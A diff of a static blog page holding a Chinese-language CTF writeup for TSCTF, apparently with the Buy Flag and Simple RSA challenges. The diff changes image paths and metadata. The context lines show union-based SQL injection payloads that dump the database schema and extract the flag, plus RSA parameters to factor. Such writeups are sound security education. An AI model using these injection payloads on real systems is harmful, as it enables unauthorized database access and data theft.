@@ -86,14 +86,14 @@
 <meta property="og:site_name" content="m3lon">
 <meta property="og:description" content="Buy Flag这道题跟今天强网杯的Three hit如出一辙，题目是一个二次注入，用户注册会将age存入数据库，登陆成功后index.php界面会从数据库中查询具有相同age的username。 二次注入：源于开发人员对数据库中的数据太过信任，凡是提取数据库中来自用户的数据不经过处理，即可触发二次注入。 刚开始做这道题的时候查看html源码发现 1234567891011  function B">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/TSCTF-Misc-Web-writeup/2.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/TSCTF-Misc-Web-writeup/3.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/TSCTF-Misc-Web-writeup/4.png">
-<meta property="og:updated_time" content="2019-02-19T01:36:29.594Z">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/2.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/3.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/4.png">
+<meta property="og:updated_time" content="2019-02-21T12:04:54.419Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TSCTF Misc&amp;Web writeup">
 <meta name="twitter:description" content="Buy Flag这道题跟今天强网杯的Three hit如出一辙，题目是一个二次注入，用户注册会将age存入数据库，登陆成功后index.php界面会从数据库中查询具有相同age的username。 二次注入：源于开发人员对数据库中的数据太过信任，凡是提取数据库中来自用户的数据不经过处理，即可触发二次注入。 刚开始做这道题的时候查看html源码发现 1234567891011  function B">
-<meta name="twitter:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/TSCTF-Misc-Web-writeup/2.png">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/2.png">
 
 
 
@@ -407,18 +407,18 @@
 <li><p>寻找注入点</p>
 <p>其实这一步是在不停的胡乱测试中偶然发现的 2333…  发现这里的内部并不是固定的</p>
 <p>1’ and 1=2# </p>
-<p><img src="TSCTF-Misc-Web-writeup/2.png" alt=""></p>
+<p><img src="2.png" alt=""></p>
 </li>
 </ul>
 <ul>
 <li><p>判断字段数<br>1’ order by 1#        正常<br>1’ order by 2#        异常<br>1’ and 1=2 union select 123#  注入点处显示123</p>
-<p><img src="TSCTF-Misc-Web-writeup/3.png" alt=""></p>
+<p><img src="3.png" alt=""></p>
 </li>
 <li><p>爆库</p>
 </li>
 </ul>
 <figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> <span class="built_in">select</span> database()<span class="meta"># </span></span><br><span class="line"><span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> <span class="built_in">select</span> group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()<span class="meta">#    children,py_flag</span></span><br><span class="line"><span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> <span class="built_in">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name='py_flag'<span class="meta">#  Id,tsctf_fla9 </span></span><br><span class="line"><span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> <span class="built_in">select</span> tsctf_fla9 from py_flag<span class="meta">#  TSCTF&#123;Simple_Sql_f0r_Y0u&#125;</span></span><br></pre></td></tr></table></figure>
-<p> <img src="TSCTF-Misc-Web-writeup/4.png" alt=""></p>
+<p> <img src="4.png" alt=""></p>
 <h3 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h3><p>010Editor打开图片发现隐藏的rsa参数</p>
 <figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">n</span>=<span class="number">52</span>A99E249EE7CF3C0CBF963A009661772BC9CDF6E1E3FBFC6E44A07A5E0F894457A9F81C3AE132AC5683D35B28BA5C324243</span><br><span class="line">十进制=<span class="number">833810193564967701912362955539789451139872863794534923259743419423089229206473091408403560311191545764221310666338878019</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">010001</span></span><br><span class="line">=&gt;<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">cipher=<span class="number">18228</span>DF578DAD6DC893CBCD95BD934D28F26C820778E7AFEB6B3BE38FD5298E497FAF8CEAA78C613E5F5FADD4BD5E50FD8A5</span><br><span class="line">=&gt; <span class="number">2434474437519739825285674247289880763631199976378755148355551547916734778248566</span> <span class="number">81065818912755263077705578942115259340965</span></span><br></pre></td></tr></table></figure>
 <p>已知n、e、cipher, 来恢复明文，利用在线因式分解<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> (注: 输入需要为十进制)，或者使用工具yafu分解</p>
@@ -574,7 +574,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
